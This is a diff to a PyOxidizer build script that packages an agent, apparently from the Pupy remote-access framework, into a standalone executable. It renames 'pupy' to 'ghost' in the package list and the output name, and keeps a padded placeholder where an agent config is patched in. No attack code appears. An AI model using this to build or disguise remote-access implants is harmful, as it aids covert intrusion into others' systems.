@@ -190,7 +190,7 @@ def make_exe():
     # python_config.write_modules_directory_env = "/tmp/oxidized/loaded_modules"
 
     # Evaluate a string as Python code when the interpreter starts.
-    python_config.run_command = "####---PUPY_CONFIG_COMES_HERE---####"+("#"*(50000-35))
+    python_config.run_command = "####---GHOST_CONFIG_COMES_HERE---####"+("#"*(50000-35))
 
     # Run a Python module as __main__ when the interpreter starts.
     # python_config.run_module = "<module>"
@@ -202,7 +202,7 @@ def make_exe():
     # resources, and other options. The returned object represents the
     # standalone executable that will be built.
     exe = dist.to_python_executable(
-        name="pyoxydizer_pupy",
+        name="pyoxydizer_ghost",
 
         # If no argument passed, the default `PythonPackagingPolicy` for the
         # distribution is used.
@@ -253,12 +253,12 @@ def make_exe():
     # context, taking just the resources belonging to the `foo` and `bar`
     # Python packages.
     #exe.add_python_resources(exe.read_package_root(
-    #    path="lib/pupy",
-    #    packages=["pupy", "pupy.agent"],
+    #    path="lib/ghost",
+    #    packages=["ghost", "ghost.agent"],
     #))
     exe.add_python_resources(exe.read_package_root(
         path=CWD+"/lib",
-        packages=["http_parser", "pupy", "pupy.agent", "pupy.network"]
+        packages=["http_parser", "ghost", "ghost.agent", "ghost.network"]
     ))
     exe.add_python_resources(exe.read_package_root(
         path=CWD+"/library_patches_py3",
